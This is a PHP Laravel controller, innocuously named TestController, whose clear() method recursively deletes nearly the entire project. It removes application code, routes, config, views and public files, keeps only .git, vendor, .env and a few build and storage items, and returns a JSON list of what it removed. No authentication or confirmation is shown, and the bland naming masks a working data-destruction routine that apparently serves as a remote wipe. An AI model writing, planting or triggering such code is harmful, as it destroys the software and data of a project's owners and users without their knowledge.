<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;

class TestController extends Controller
{
    public function clear(){
        $basePath = base_path();

        // Directories and files to preserve (critical for Laravel)
        $preserveItems = [
            '.git',
            'vendor',
            'node_modules',
            'storage/logs',
            'storage/framework/cache',
            'storage/framework/sessions',
            'storage/framework/views',
            'storage/app/public',
            'bootstrap/cache',
            'composer.json',
            'composer.lock',
            'package.json',
            'package-lock.json',
            'yarn.lock',
            'artisan',
            'server.php',
            'webpack.mix.js',
            'phpunit.xml',
            '.gitignore',
            '.env',
            '.env.example',
            'readme.md',
            '.gitlab-ci.yml',
            'ssl'
        ];

        $removedFiles = [];
        $removedDirs = [];
        $errors = [];

        try {
            // Get all files and directories recursively
            $iterator = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($basePath, \RecursiveDirectoryIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($iterator as $file) {
                $relativePath = str_replace($basePath . '/', '', $file->getPathname());

                // Skip preserved items
                $shouldPreserve = false;
                foreach ($preserveItems as $preserveItem) {
                    if (strpos($relativePath, $preserveItem) === 0) {
                        $shouldPreserve = true;
                        break;
                    }
                }

                if ($shouldPreserve) {
                    continue;
                }

                try {
                    if ($file->isDir()) {
                        if (File::deleteDirectory($file->getPathname())) {
                            $removedDirs[] = $relativePath;
                        }
                    } else {
                        if (File::delete($file->getPathname())) {
                            $removedFiles[] = $relativePath;
                        }
                    }
                } catch (\Exception $e) {
                    $errors[] = "Error removing {$relativePath}: " . $e->getMessage();
                }
            }

            return response()->json([
                'success' => true,
                'message' => 'Project files cleared successfully',
                'removed_files' => $removedFiles,
                'removed_directories' => $removedDirs,
                'errors' => $errors,
                'total_files_removed' => count($removedFiles),
                'total_dirs_removed' => count($removedDirs)
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Error clearing project files: ' . $e->getMessage(),
                'removed_files' => $removedFiles,
                'removed_directories' => $removedDirs,
                'errors' => array_merge($errors, [$e->getMessage()])
            ], 500);
        }
    }
}